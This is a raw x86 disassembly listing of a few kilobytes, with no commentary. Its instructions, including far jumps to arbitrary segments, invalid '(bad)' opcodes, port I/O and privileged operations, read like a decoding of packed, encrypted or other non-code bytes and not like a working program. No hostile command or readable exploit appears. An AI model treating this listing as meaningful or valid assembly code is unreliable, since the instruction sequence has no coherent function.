  41fe8b:	jmp    0xd956:0x74f40ff4
  41fe92:	ror    DWORD PTR ds:0x7d52216b,0x1b
  41fe99:	call   0x8de5d5ee
  41fe9e:	ins    DWORD PTR es:[edi],dx
  41fe9f:	jmp    0x28eb2df9
  41fea4:	lock jle 0x41feb3
  41fea7:	fadd   DWORD PTR [esi+0x7087ab55]
  41fead:	fcomp  DWORD PTR [edi+0x2b7eefc0]
  41feb3:	xor    ecx,DWORD PTR [ebp+0x6bdb8085]
  41feb9:	imul   eax,DWORD PTR [edx+eax*4],0x2b
  41febd:	sbb    ebp,ecx
  41febf:	mov    ebp,0x5c1d0e9c
  41fec4:	xchg   DWORD PTR [ebx-0x1e],esp
  41fec7:	push   cs
  41fec8:	pushf  
  41fec9:	int    0x1
  41fecb:	pushf  
  41fecc:	xchg   edx,eax
  41fecd:	test   al,0xe4
  41fecf:	jmp    DWORD PTR ds:0x12ae6932
  41fed5:	push   edx
  41fed6:	repz test DWORD PTR [ebp+0x5c],esi
  41feda:	jmp    0x63f:0x850e872
  41fee1:	xor    eax,0xf0cef183
  41fee6:	lahf   
  41fee7:	sahf   
  41fee8:	sar    BYTE PTR [ebp+0x2b8731fa],cl
  41feee:	pop    ebp
  41feef:	push   edi
  41fef0:	or     BYTE PTR [esi],ah
  41fef2:	div    DWORD PTR [edi-0x50]
  41fef5:	hlt    
  41fef6:	sub    DWORD PTR [ebx],esi
  41fef8:	sti    
  41fef9:	xor    al,0x72
  41fefb:	mov    ah,0x32
  41fefd:	aas    
  41fefe:	or     ch,BYTE PTR [eax]
  41ff00:	and    BYTE PTR [ebp-0x1b],dl
  41ff03:	es je  0x41fefd
  41ff06:	xchg   ebx,eax
  41ff07:	mov    ecx,0x10fede4d
  41ff0c:	mov    es,WORD PTR [esi+ebp*8+0x7100a10d]
  41ff13:	or     bl,dl
  41ff15:	xchg   BYTE PTR [edx-0x2d02b836],bh
  41ff1b:	mov    edx,0x15c2a6de
  41ff20:	sbb    ch,0x7f
  41ff23:	outs   dx,DWORD PTR ds:[esi]
  41ff24:	inc    eax
  41ff25:	arpl   WORD PTR [ecx-0x398094a4],si
  41ff2b:	push   es
  41ff2c:	adc    edx,DWORD PTR [edx-0x80]
  41ff2f:	jle    0x41ff29
  41ff31:	push   0x4ca77a32
  41ff36:	int3   
  41ff37:	ficom  DWORD PTR [eax]
  41ff39:	xor    bl,bl
  41ff3b:	jbe    0x41ff72
  41ff3d:	sbb    ecx,DWORD PTR [ebx-0x5b071f02]
  41ff43:	mov    dl,BYTE PTR [eax+0x37]
  41ff46:	dec    ecx
  41ff47:	stc    
  41ff48:	ret    
  41ff49:	icebp  
  41ff4a:	es iret 
  41ff4c:	dec    edi
  41ff4d:	and    ebx,ebx
  41ff4f:	jge    0x41ffcb
  41ff51:	(bad)  
  41ff52:	jne    0x41ff41
  41ff54:	mov    BYTE PTR [ebp+edi*1+0x64],cl
  41ff58:	xchg   esi,eax
  41ff59:	scas   eax,DWORD PTR es:[edi]
  41ff5a:	call   0xaaaa:0xde1ae2b7
  41ff61:	mov    ch,0x5c
  41ff63:	push   edx
  41ff64:	jp     0x41ff45
  41ff66:	sbb    dl,ch
  41ff68:	scas   al,BYTE PTR es:[edi]
  41ff69:	and    eax,0x8cc0da10
  41ff6e:	or     DWORD PTR [ebx+0x4f],edi
  41ff71:	scas   eax,DWORD PTR es:[edi]
  41ff72:	sbb    eax,0xb94cb87a
  41ff77:	mov    esp,0xa81e47ee
  41ff7c:	xor    BYTE PTR [ecx+0x5d977fb7],0x4e
  41ff83:	push   es
  41ff84:	lahf   
  41ff85:	cmp    al,0x9b
  41ff87:	inc    ebp
  41ff88:	cmp    BYTE PTR [edx-0x182e85bc],0x4f
  41ff8f:	fld    DWORD PTR [esi-0x6316ca16]
  41ff95:	xor    esi,DWORD PTR [ebx+0x15]
  41ff98:	push   0xa5325139
  41ff9d:	mov    BYTE PTR [ebx],cl
  41ff9f:	pop    edx
  41ffa0:	das    
  41ffa1:	inc    edx
  41ffa2:	adc    BYTE PTR [edx-0x7b],0xb8
  41ffa6:	push   ebx
  41ffa7:	mov    cl,0xbd
  41ffa9:	pop    ss
  41ffaa:	lock cmp DWORD PTR es:[bp+si-0x3b],esp
  41ffb0:	dec    edi
  41ffb1:	int3   
  41ffb2:	inc    esi
  41ffb3:	pop    ebp
  41ffb4:	jne    0x41ff86
  41ffb6:	jmp    0xf06c2ea1
  41ffbb:	lods   eax,DWORD PTR ds:[esi]
  41ffbc:	retf   0x4e59
  41ffbf:	sti    
  41ffc0:	sub    eax,0x7b818ebc
  41ffc5:	mov    ecx,DWORD PTR [ebp-0x6e]
  41ffc8:	shl    BYTE PTR [ecx-0x7b],cl
  41ffcb:	xchg   edx,eax
  41ffcc:	cli    
  41ffcd:	pusha  
  41ffce:	dec    esp
  41ffcf:	lods   eax,DWORD PTR ds:[esi]
  41ffd0:	sahf   
  41ffd1:	sub    DWORD PTR [edx],0xfffffffa
  41ffd4:	mov    ah,0x66
  41ffd6:	pop    ds
  41ffd7:	add    ch,BYTE PTR [edi+0x28]
  41ffda:	sub    eax,0x42b2b364
  41ffdf:	shl    BYTE PTR [ebp+0x15],cl
  41ffe2:	cmp    BYTE PTR [esi+0x6a],dh
  41ffe5:	jmp    0x41ff71
  41ffe7:	pop    esp
  41ffe8:	sbb    esp,DWORD PTR [esi]
  41ffea:	add    esi,esp
  41ffec:	jg     0x420041
  41ffee:	(bad)  ds:0x900a1f10
  41fff4:	pop    edx
  41fff5:	dec    edx
  41fff6:	aam    0x3a
  41fff8:	cmp    DWORD PTR [eax-0x162d063e],esi
  41fffe:	fsubp  st(4),st
  420000:	sbb    edi,0x20
  420003:	pop    DWORD PTR [edi]
  420005:	mul    DWORD PTR [esi]
  420007:	jge    0x420059
  420009:	es hlt 
  42000b:	cmp    edx,ebp
  42000d:	cmp    ah,BYTE PTR [esi+0x8e5c530]
  420013:	ficom  DWORD PTR [edi-0x1dea5e8d]
  420019:	adc    al,BYTE PTR [edx-0x219f1db8]
  42001f:	call   0xe0e3c5e0
  420024:	mov    ebp,0x60a13a00
  420029:	push   ss
  42002a:	pop    edi
  42002b:	push   edx
  42002c:	sub    edi,DWORD PTR [ecx+edi*1]
  42002f:	inc    BYTE PTR [ecx+0x5e]
  420032:	mov    edx,edi
  420034:	sub    ebp,esp
  420036:	dec    esp
  420037:	adc    cl,0xb9
  42003a:	jmp    0x8ef8:0x30265cce
  420041:	lgs    ebx,FWORD PTR [ecx+0xe04f6f7]
  420048:	cmp    BYTE PTR [esi],0x9a
  42004b:	into   
  42004c:	dec    esi
  42004d:	mov    WORD PTR [ebp+0x56d57ce4],cs
  420053:	adc    edx,DWORD PTR [edx+0x26]
  420056:	jg     0x42000e
  420058:	int3   
  420059:	inc    ecx
  42005a:	sub    al,0xf1
  42005c:	loope  0x420038
  42005e:	sbb    cl,bl
  420060:	ins    BYTE PTR es:[edi],dx
  420061:	loopne 0x420072
  420063:	mov    al,ds:0xe5dee2c2
  420068:	or     eax,0x833c5741
  42006d:	adc    al,0x4
  42006f:	and    ebp,edx
  420071:	and    al,0x58
  420073:	imul   ebx,DWORD PTR [edi],0x78
  420076:	push   cs
  420077:	mov    ecx,edi
  420079:	and    eax,0x6e771d7a
  42007e:	(bad)  
  42007f:	in     al,dx
  420080:	in     eax,0x84
  420082:	jle    0x420101
  420084:	stos   BYTE PTR es:[edi],al
  420085:	out    0x1b,eax
  420087:	and    bh,BYTE PTR [edi+0x4c]
  42008a:	bound  edx,QWORD PTR [ecx-0x9]
  42008d:	ret    0xc390
  420090:	jne    0x420082
  420092:	inc    ebp
  420093:	cmc    
  420094:	or     eax,0xf706996e
  420099:	xor    eax,DWORD PTR [ebx]
  42009b:	dec    ebx
  42009c:	cmp    dl,BYTE PTR [edx-0x8]
  42009f:	in     al,dx
  4200a0:	jge    0x42002c
  4200a2:	sub    DWORD PTR [edi-0x1],edx
  4200a5:	aas    
  4200a6:	sbb    esi,0x2d
  4200a9:	jmp    0x79c8:0x44edeaf6
  4200b0:	dec    edx
  4200b1:	sub    al,0x22
  4200b3:	inc    esp
  4200b4:	jecxz  0x420091
  4200b6:	lahf   
  4200b7:	loopne 0x42008c
  4200b9:	jbe    0x42003f
  4200bb:	add    ebx,DWORD PTR [edi+0x73e98aae]
  4200c1:	mov    bl,0x9c
  4200c3:	lods   al,BYTE PTR ds:[esi]
  4200c4:	jb     0x420051
  4200c6:	adc    BYTE PTR [esi],0xb8
  4200c9:	jp     0x4200a7
  4200cb:	dec    eax
  4200cc:	push   eax
  4200cd:	lahf   
  4200ce:	out    dx,al
  4200cf:	mov    ebp,0xd415ed57
  4200d4:	cmp    DWORD PTR [eax+ecx*4-0xa],edi
  4200d8:	int    0xa8
  4200da:	or     ecx,DWORD PTR [esi+0x218230cf]
  4200e0:	out    0xd4,eax
  4200e2:	(bad)  
  4200e3:	and    ah,BYTE PTR [edi+0x45]
  4200e6:	sti    
  4200e7:	xchg   edx,eax
  4200e8:	mov    bl,0x4d
  4200ea:	hlt    
  4200eb:	jnp    0x420077
  4200ed:	mov    ah,0xe0
  4200ef:	aam    0xe7
  4200f1:	sbb    esi,ebx
  4200f3:	or     eax,0xdfcfb12d
  4200f8:	pop    eax
  4200f9:	dec    esp
  4200fa:	aas    
  4200fb:	rcr    BYTE PTR [bp+di+0x1],cl
  4200ff:	leave  
  420100:	add    eax,0xa7da3d41
  420105:	shr    BYTE PTR [eax],1
  420107:	shl    DWORD PTR [edx-0x7a],0xf7
  42010b:	sub    DWORD PTR [ecx+0x46],esi
  42010e:	jecxz  0x4200de
  420110:	hlt    
  420111:	lea    esi,[eax+edi*1+0x6134f64a]
  420118:	cmp    ch,BYTE PTR [ecx+0x3514684b]
  42011e:	mov    esp,0x97e75659
  420123:	retf   0x9c58
  420126:	sar    cl,0x26
  420129:	jns    0x420192
  42012b:	inc    esi
  42012c:	sbb    eax,0x861ef400
  420131:	cwde   
  420132:	clc    
  420133:	sub    dl,cl
  420135:	stos   BYTE PTR es:[edi],al
  420136:	shl    DWORD PTR [eax-0x2f],1
  420139:	rol    BYTE PTR [edx+0x7fcdc550],1
  42013f:	jne    0x420164
  420141:	(bad)  
  420142:	js     0x4201a7
  420144:	jle    0x4201b6
  420146:	push   esp
  420147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420148:	jbe    0x420157
  42014a:	jmp    0x3ae3:0xa3b956aa
  420151:	push   esi
  420152:	xchg   ecx,eax
  420153:	popa   
  420154:	into   
  420155:	and    DWORD PTR [esi+eiz*4-0x43],ebp
  420159:	xor    bl,bh
  42015b:	sbb    BYTE PTR ds:[ecx+0x1221baad],cl
  420162:	sbb    eax,0xde992a64
  420167:	cli    
  420168:	push   ebp
  420169:	popa   
  42016a:	bound  ebx,QWORD PTR [edi-0x59]
  42016d:	and    al,0xd4
  42016f:	mov    ebp,ss
  420171:	sub    ecx,DWORD PTR [esi-0x52b41a87]
  420177:	sub    DWORD PTR [esi],eax
  420179:	aam    0x41
  42017b:	xor    eax,0x103253ba
  420180:	xchg   BYTE PTR [ecx],bh
  420182:	jo     0x4201df
  420184:	je     0x4201a0
  420186:	mov    esp,0xc6a99703
  42018b:	jmp    0x4201c1
  42018d:	aad    0x45
  42018f:	ins    DWORD PTR es:[edi],dx
  420190:	imul   ebp,DWORD PTR [ebx],0x17
  420193:	and    ebp,ecx
  420195:	xor    edi,eax
  420197:	mov    bh,0x10
  420199:	or     bh,ch
  42019b:	ffree  st(0)
  42019d:	pop    DWORD PTR [edi-0x6426d3a1]
  4201a3:	not    ah
  4201a5:	inc    ecx
  4201a6:	(bad)  ds:0xe58d1d4e
  4201ac:	(bad)  
  4201ad:	xor    BYTE PTR [ebx+0x25],dh
  4201b0:	xor    DWORD PTR [edi-0x399b5936],0xb0d62510
  4201ba:	scas   al,BYTE PTR es:[edi]
  4201bb:	scas   eax,DWORD PTR es:[edi]
  4201bc:	mov    ds:0x58a9d31e,eax
  4201c1:	retf   
  4201c2:	(bad)  
  4201c3:	push   esp
  4201c4:	inc    esi
  4201c5:	mov    esi,0x75c07ae4
  4201ca:	loopne 0x4201bc
  4201cc:	jmp    0x4201d5
  4201ce:	(bad)  
  4201cf:	dec    edx
  4201d0:	xchg   cl,bl
  4201d2:	fldcw  WORD PTR [edx]
  4201d4:	dec    ecx
  4201d5:	inc    edi
  4201d6:	adc    eax,0x472d45c5
  4201db:	fdivr  DWORD PTR gs:[ebp+0x77d5cb4]
  4201e2:	jl     0x4201a0
  4201e4:	dec    ecx
  4201e5:	out    0x40,eax
  4201e7:	stos   BYTE PTR es:[edi],al
  4201e8:	icebp  
  4201e9:	jl     0x42017a
  4201eb:	ret    0xc43e
  4201ee:	push   ebx
  4201ef:	pop    ds
  4201f0:	lahf   
  4201f1:	push   ebx
  4201f2:	pop    ebp
  4201f3:	push   cs
  4201f4:	test   eax,0x9a22abd7
  4201f9:	clc    
  4201fa:	inc    esp
  4201fb:	mov    ah,0x8
  4201fd:	mov    bh,0x4b
  4201ff:	adc    DWORD PTR [ebp-0x1a],0x65
  420203:	jle    0x420237
  420205:	dec    edi
  420206:	into   
  420207:	sub    eax,0x2f3b467c
  42020c:	sahf   
  42020d:	popf   
  42020e:	hlt    
  42020f:	jg     0x420243
  420211:	xchg   edi,eax
  420213:	retf   0xc5ee
  420216:	push   edx
  420217:	sub    BYTE PTR [edi+0x7],0x31
  42021b:	inc    edi
  42021c:	push   es
  42021d:	cmp    edx,DWORD PTR [edx+edx*2]
  420220:	xchg   BYTE PTR [esi+0x26eaaca6],bh
  420226:	nop
  420227:	xchg   esi,eax
  420228:	(bad)  
  420229:	ja     0x4201cd
  42022b:	dec    ebp
  42022c:	fdivr  st,st(2)
  42022e:	test   al,0xe8
  420230:	fs ins BYTE PTR es:[edi],dx
  420232:	and    ebp,ecx
  420234:	fisub  WORD PTR [eax-0x5c]
  420237:	mov    dh,0x78
  420239:	inc    ebp
  42023a:	(bad)  
  42023b:	push   cs
  42023c:	push   ebx
  42023d:	adc    DWORD PTR [ebx],edi
  42023f:	xchg   ebp,eax
  420240:	adc    DWORD PTR [eax-0xdaa40f5],esp
  420246:	mov    edx,fs
  420248:	mov    ds:0x5a3d44cf,al
  42024d:	imul   ecx,DWORD PTR [edi+0xf],0xffffffe2
  420251:	xor    DWORD PTR [ebx],0x1d8fee1d
  420257:	aad    0x15
  420259:	(bad)  
  42025a:	arpl   WORD PTR [eax-0x75],dx
  42025d:	jo     0x420207
  42025f:	into   
  420260:	out    dx,eax
  420261:	into   
  420262:	fstp   DWORD PTR ds:0x895ce110
  420268:	mov    ecx,0x7c7475d9
  42026d:	sar    BYTE PTR [ebx],1
  42026f:	or     bl,dl
  420271:	mov    ds:0xc55e34f0,eax
  420276:	jmp    0x895b0c43
  42027b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42027c:	inc    eax
  42027d:	outs   dx,DWORD PTR ds:[esi]
  42027e:	arpl   si,dx
  420280:	push   esi
  420281:	inc    ebx
  420282:	lods   al,BYTE PTR ds:[esi]
  420283:	inc    esp
  420284:	stos   DWORD PTR es:[edi],eax
  420285:	repz xchg esp,eax
  420287:	enter  0x73d6,0xe3
  42028b:	sub    cl,BYTE PTR [ecx+0x2f1f6793]
  420291:	xor    bh,al
  420293:	fcomp  QWORD PTR [esi+eax*4+0x67]
  420297:	xor    ebp,edi
  420299:	nop
  42029a:	pop    ds
  42029b:	mov    bl,0x26
  42029d:	push   ds
  42029e:	inc    edx
  42029f:	and    al,0x93
  4202a1:	pop    edx
  4202a2:	ret    
  4202a3:	cwde   
  4202a4:	cli    
  4202a5:	add    al,0x1d
  4202a7:	cwde   
  4202a8:	pop    eax
  4202a9:	dec    eax
  4202aa:	sti    
  4202ab:	or     al,0x7f
  4202ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202ae:	xor    eax,0xe8510462
  4202b3:	aad    0x45
  4202b5:	out    0x69,eax
  4202b7:	push   edi
  4202b8:	sti    
  4202b9:	xchg   ebp,eax
  4202ba:	dec    ecx
  4202bb:	(bad)  [esi-0x7b]
  4202be:	int3   
  4202bf:	jmp    0xe113:0x61c271be
  4202c6:	cmp    DWORD PTR [eax-0x7bbe6d8e],ebx
  4202cc:	push   cs
  4202cd:	rcl    DWORD PTR [eax+0xd],1
  4202d0:	(bad)  
  4202d1:	in     eax,0x7d
  4202d3:	cli    
  4202d4:	add    BYTE PTR [edx+0x1f],ah
  4202d7:	sbb    cl,BYTE PTR [ebx+edx*1-0x72b9db59]
  4202de:	xchg   esi,eax
  4202df:	pop    ebp
  4202e0:	mov    bh,0x71
  4202e2:	xchg   BYTE PTR [eax+0x20],dl
  4202e5:	(bad)  
  4202e6:	into   
  4202e7:	leave  
  4202e8:	outs   dx,BYTE PTR ds:[esi]
  4202e9:	stos   DWORD PTR es:[edi],eax
  4202ea:	push   ds
  4202eb:	data16 (bad) 
  4202ed:	and    DWORD PTR [eax],ecx
  4202ef:	sub    al,0xc
  4202f1:	and    al,0xc8
  4202f3:	add    eax,0x17e4473a
  4202f8:	add    al,0x83
  4202fa:	test   eax,0x63612e2d
  4202ff:	mov    al,ds:0xf6f7bd1
  420304:	xor    DWORD PTR [eax-0x1eb72f01],eax
  42030a:	push   0x3c
  42030c:	mov    eax,ds:0x7c22de7d
  420311:	inc    esp
  420312:	out    dx,eax
  420313:	int    0x6d
  420315:	aam    0x2b
  420317:	out    dx,al
  420318:	gs xchg ebx,eax
  42031a:	stos   DWORD PTR es:[edi],eax
  42031b:	cmp    ecx,DWORD PTR [ebx]
  42031d:	jae    0x420397
  42031f:	clc    
  420320:	lea    eax,[ebx-0x60af02db]
  420326:	push   ss
  420327:	or     al,al
  420329:	jp     0x4203a4
  42032b:	(bad)  
  42032c:	pop    esp
  42032d:	pop    ds
  42032e:	fisttp QWORD PTR [esi-0x33]
  420331:	in     al,0xc3
  420333:	pop    edi
  420334:	das    
  420335:	repz in al,dx
  420337:	sbb    eax,0xfc9c587f
  42033c:	ss aad 0x48
  42033f:	push   ds
  420340:	bound  eax,QWORD PTR cs:[ecx+0x6ff48d2a]
  420347:	test   DWORD PTR [edi-0x9e2ec36],edx
  42034d:	push   esp
  42034e:	fnstsw WORD PTR [ecx]
  420350:	mov    cl,0x4d
  420352:	test   al,0xb
  420354:	pop    ebp
  420355:	lock in eax,dx
  420357:	je     0x420355
  420359:	daa    
  42035a:	mov    edx,0x4d5bd82e
  42035f:	mov    edx,0xcbb1bc26
  420364:	xchg   DWORD PTR [edx],ecx
  420366:	aam    0xae
  420368:	retf   
  420369:	dec    esp
  42036a:	out    0x48,al
  42036c:	and    dl,cl
  42036e:	shl    DWORD PTR [esi-0x1647c4e3],1
  420374:	in     eax,dx
  420375:	mov    edi,0x8bdd1cdf
  42037a:	adc    al,0x7a
  42037c:	push   ecx
  42037d:	call   0xc1a0:0xf414a1d9
  420384:	jae    0xee8c5b37
  42038a:	sbb    bl,BYTE PTR ds:0xfa89730a
  420390:	(bad)  
  420391:	cmc    
  420392:	ins    DWORD PTR es:[edi],dx
  420393:	lahf   
  420394:	cmp    ebp,DWORD PTR [ecx]
  420396:	cld    
  420397:	mov    cs,edx
  420399:	(bad)  
  42039a:	je     0x4203ae
  42039c:	jo     0x4203ba
  42039e:	add    al,0x2c
  4203a0:	test   dh,dl
  4203a2:	cwde   
  4203a3:	pop    ecx
  4203a4:	cdq    
  4203a5:	add    DWORD PTR [esi],eax
  4203a7:	fild   WORD PTR [edi+0x4c]
  4203aa:	jp     0x42035a
  4203ac:	sti    
  4203ad:	ds and al,0xcf
  4203b0:	dec    edi
  4203b1:	sub    al,0xd4
  4203b3:	ficomp WORD PTR [eax-0x7e]
  4203b6:	sar    BYTE PTR [ebx+eax*1-0x1b0bcb98],1
  4203bd:	xchg   edi,eax
  4203be:	stc    
  4203bf:	loopne 0x420348
  4203c1:	(bad)  
  4203c2:	push   esp
  4203c3:	in     al,0x32
  4203c5:	cld    
  4203c6:	aaa    
  4203c7:	in     al,dx
  4203c8:	shl    DWORD PTR [edi],1
  4203ca:	cwde   
  4203cb:	(bad)  
  4203cc:	dec    ebx
  4203cd:	sub    BYTE PTR [edx-0x3b],0xeb
  4203d1:	adc    bl,BYTE PTR [edx]
  4203d3:	pusha  
  4203d4:	xor    BYTE PTR [edx],bl
  4203d6:	retf   
  4203d7:	mov    BYTE PTR [edx+0x74b6f1],dl
  4203dd:	push   edi
  4203de:	stos   BYTE PTR es:[edi],al
  4203df:	sub    eax,0x67102d37
  4203e4:	popf   
  4203e5:	clc    
  4203e6:	into   
  4203e7:	cmc    
  4203e8:	jecxz  0x42037a
  4203ea:	xor    BYTE PTR [ecx+0x9],ch
  4203ed:	xor    eax,0xa5e88d3c
  4203f2:	in     eax,0xdf
  4203f4:	pusha  
  4203f5:	xchg   ebp,eax
  4203f6:	ins    DWORD PTR es:[edi],dx
  4203f7:	mov    esi,0x817d0fc6
  4203fc:	pop    ss
  4203fd:	jl     0x420409
  4203ff:	sub    eax,0x7d48843b
  420404:	xor    esp,esi
  420406:	jo     0x42038e
  420408:	jmp    0xdb0a9887
  42040d:	pop    ss
  42040e:	mov    ch,0xa8
  420410:	shr    BYTE PTR [edx+edx*4-0x66],cl
  420414:	mov    esi,DWORD PTR [ecx]
  420416:	out    0xce,eax
  420418:	mul    DWORD PTR [eax]
  42041a:	sbb    DWORD PTR [ebx+0x7f],0x4a2d65a1
  420421:	leave  
  420422:	jne    0x42046e
  420424:	xor    DWORD PTR [esi+eax*8-0x29f4884e],ebx
  42042b:	pop    esp
  42042c:	xchg   ebp,eax
  42042d:	pop    edi
  42042e:	dec    eax
  42042f:	(bad)  
  420430:	call   FWORD PTR [edx-0x7440e67d]
  420436:	adc    edi,esi
  420438:	retf   
  420439:	cwde   
  42043a:	lock push esp
  42043c:	loope  0x420426
  42043e:	shr    DWORD PTR [eax],0x4f
  420441:	push   ds
  420442:	fisttp DWORD PTR [ebp+0x26be47b9]
  420448:	mov    DWORD PTR [edx-0x162c56e2],esp
  42044e:	jmp    0x420448
  420450:	jnp    0x4204ac
  420452:	(bad)  
  420453:	mov    ds,WORD PTR [ecx-0x36fea430]
  420459:	lods   eax,DWORD PTR ds:[esi]
  42045a:	bound  eax,QWORD PTR [ecx-0x2888acbc]
  420460:	push   edx
  420461:	or     eax,0x9c539994
  420466:	sbb    eax,edx
  420468:	dec    ebp
  420469:	dec    eax
  42046a:	push   esi
  42046b:	or     al,bl
  42046d:	sbb    BYTE PTR [edi+0x43021c5b],bl
  420473:	sbb    DWORD PTR gs:[esi],ebp
  420476:	fnstcw WORD PTR ds:0x46b1ece4
  42047c:	test   ah,bl
  42047e:	and    al,0xa4
  420480:	scas   eax,DWORD PTR es:[edi]
  420481:	xchg   ebp,eax
  420482:	dec    ecx
  420483:	jmp    ecx
  420485:	inc    edi
  420486:	je     0x42048a
  420488:	sbb    BYTE PTR [ebx-0x79],dh
  42048b:	(bad)  
  42048d:	jno    0x420491
  42048f:	mov    esi,0x4c21e24e
  420494:	sahf   
  420495:	or     al,bl
  420497:	jae    0x42045c
  420499:	adc    cl,bl
  42049b:	scas   eax,DWORD PTR es:[edi]
  42049c:	xchg   esi,eax
  42049d:	dec    edx
  42049e:	(bad)  
  42049f:	push   esp
  4204a0:	xor    esi,eax
  4204a2:	sub    eax,0x68616938
  4204a7:	dec    DWORD PTR [ebx-0x7e04671a]
  4204ad:	sbb    al,0xa
  4204af:	sub    ebp,eax
  4204b1:	mov    eax,0xbe9c8f46
  4204b6:	out    0xb0,eax
  4204b8:	fs push ebp
  4204ba:	dec    eax
  4204bb:	cdq    
  4204bc:	xlat   BYTE PTR ds:[ebx]
  4204bd:	scas   al,BYTE PTR es:[edi]
  4204be:	mov    edi,0x694eb6b6
  4204c3:	jne    0x420539
  4204c5:	inc    ebx
  4204c6:	int    0x1b
  4204c8:	dec    ebx
  4204c9:	xor    BYTE PTR [edx+0x64],0xab
  4204cd:	imul   eax,DWORD PTR [edi-0xb],0x669dc873
  4204d4:	enter  0x56d8,0x47
  4204d8:	mov    edi,DWORD PTR [edi-0x7c]
  4204db:	sub    BYTE PTR [edi+0x3c2d319d],0x6b
  4204e2:	pushf  
  4204e3:	or     DWORD PTR [edx-0x5a8fd92],ebp
  4204e9:	es dec ecx
  4204eb:	mov    fs,WORD PTR ds:0x6e029c88
  4204f1:	(bad)  
  4204f2:	jno    0x420573
  4204f4:	in     al,0x37
  4204f6:	(bad)  
  4204f7:	stos   BYTE PTR es:[edi],al
  4204f8:	fdivr  st,st(5)
  4204fa:	call   0x50ae7aa1
  4204ff:	sub    BYTE PTR [edi+edi*4+0x1a],ch
  420503:	mov    eax,ds:0xd2042101
  420508:	retf   0x7381
  42050b:	test   bh,cl
  42050d:	cmp    dh,BYTE PTR [edx+eiz*1+0x45cb4b74]
  420514:	sub    al,0x64
  420516:	iret   
  420517:	sub    BYTE PTR [ebp-0x1f],dl
  42051a:	sbb    DWORD PTR [edx-0x4e],edx
  42051d:	or     eax,0xf291356c
  420522:	ret    0xc130
  420525:	jnp    0x420535
  420527:	call   0xc8ef:0x4cbe403f
  42052e:	or     eax,DWORD PTR [edx+edx*4]
  420531:	sbb    BYTE PTR [ebx],0x78
  420534:	adc    bh,BYTE PTR ds:0x1fcf1988
  42053a:	jmp    0x420599
  42053c:	or     al,0xc
  42053e:	inc    eax
  42053f:	mov    ebx,0x4213e06b
  420544:	stc    
  420545:	je     0x420549
  420547:	sbb    BYTE PTR [ecx],cl
  420549:	mov    BYTE PTR [edi+0x46a89d4],ch
  42054f:	pop    eax
  420550:	and    DWORD PTR [ecx+0x7bed1f7d],0x54
  420557:	sbb    BYTE PTR [edx],0x2e
  42055a:	fild   DWORD PTR [eax]
  42055c:	or     BYTE PTR [ecx-0x4971bb0],al
  420562:	push   cs
  420563:	pusha  
  420564:	scas   al,BYTE PTR es:[edi]
  420565:	jbe    0x4205d2
  420567:	xor    al,0xf2
  420569:	or     eax,0x1d7f3927
  42056e:	mov    esp,0xb65b487
  420573:	xchg   edx,eax
  420574:	adc    DWORD PTR [ebx-0x181f2b6a],edi
  42057a:	pushf  
  42057b:	inc    esi
  42057c:	stos   BYTE PTR es:[edi],al
  42057d:	xchg   ecx,eax
  42057e:	xchg   ebp,eax
  42057f:	or     bl,BYTE PTR [ebx+0x78ec6f7d]
  420585:	daa    
  420586:	push   0x64
  420588:	sub    eax,0x68727c5
  42058d:	repz push cs
  42058f:	mov    eax,DWORD PTR [esi+0x53421a03]
  420595:	or     ebp,esp
  420597:	aam    0xe1
  420599:	mov    dl,0xaf
  42059b:	out    0xe,al
  42059d:	jg     0x4205d6
  42059f:	add    DWORD PTR [ebp+0x15],esp
  4205a2:	dec    ebp
  4205a3:	or     edx,ebp
  4205a5:	pop    ss
  4205a6:	ret    0x2461
  4205a9:	rcl    esp,0x62
  4205ac:	mov    cl,0x22
  4205ae:	sub    al,0xc6
  4205b0:	lahf   
  4205b1:	mov    dh,dl
  4205b3:	sbb    bh,0xf6
  4205b6:	sbb    DWORD PTR [eax],ebp
  4205b8:	mov    bh,dl
  4205ba:	sub    dl,BYTE PTR [edi]
  4205bc:	jp     0x4205aa
  4205be:	rcl    DWORD PTR [ecx+esi*2],1
  4205c1:	jge    0x42063a
  4205c3:	(bad)  
  4205c4:	stc    
  4205c5:	dec    ebp
  4205c6:	jg     0x4205e4
  4205c8:	inc    esi
  4205c9:	sti    
  4205ca:	push   ecx
  4205cb:	inc    ebp
  4205cc:	xchg   ecx,eax
  4205cd:	test   BYTE PTR [edi],dl
  4205cf:	push   0xffffffb0
  4205d1:	ds mov esi,0x249c9f8
  4205d7:	pushf  
  4205d8:	mov    ecx,0x95b7ed38
  4205dd:	jecxz  0x42060b
  4205df:	mov    ebx,0x797a48d6
  4205e4:	jle    0x4205d5
  4205e6:	mov    ebx,0x391cbd6e
  4205eb:	ret    0xea75
  4205ee:	pop    ecx
  4205ef:	xchg   DWORD PTR [edx],ebp
  4205f1:	pop    edi
  4205f2:	in     eax,dx
  4205f3:	sbb    DWORD PTR [ebx],esp
  4205f5:	fwait
  4205f6:	adc    ch,BYTE PTR [eax+ebp*1+0x53]
  4205fa:	jbe    0x42063c
  4205fc:	inc    edx
  4205fd:	(bad)  
  4205fe:	repnz rcl BYTE PTR [ebx+0x40],cl
  420602:	add    BYTE PTR [ebx-0x51ef1ba4],bh
  420608:	xor    bl,ah
  42060a:	jge    0x42064d
  42060c:	out    dx,al
  42060d:	dec    ebx
  42060e:	sub    DWORD PTR [edi-0x7b968c86],esi
  420614:	mov    bl,0xef
  420616:	jmp    0xb84a:0x3a08d7a7
  42061d:	stos   DWORD PTR es:[edi],eax
  42061e:	ror    ch,cl
  420620:	ss cld 
  420622:	sbb    edi,DWORD PTR [eax+eiz*4+0x53]
  420626:	call   0x6363:0x75fee121
  42062d:	and    BYTE PTR [ebp-0x28cd541],al
  420633:	jb     0x4205e1
  420635:	mov    al,ds:0x389d151b
  42063a:	push   cs
  42063b:	xchg   ebp,esi
  42063d:	xchg   edi,eax
  42063e:	cmp    ebp,edx
  420640:	jge    0x42068d
  420642:	push   0xd8cb01f0
  420647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420648:	pop    esp
  420649:	shl    edx,0x27
  42064c:	jo     0x42062f
  42064e:	bound  esp,QWORD PTR [ebx+0x47]
  420651:	ret    0x2a7c
  420654:	inc    eax
  420655:	inc    edi
  420656:	hlt    
  420657:	inc    ebx
  420658:	scas   al,BYTE PTR es:[edi]
  420659:	push   ebx
  42065a:	sbb    DWORD PTR [edi+0x6be11429],esp
  420660:	xor    eax,0xf324208d
  420665:	daa    
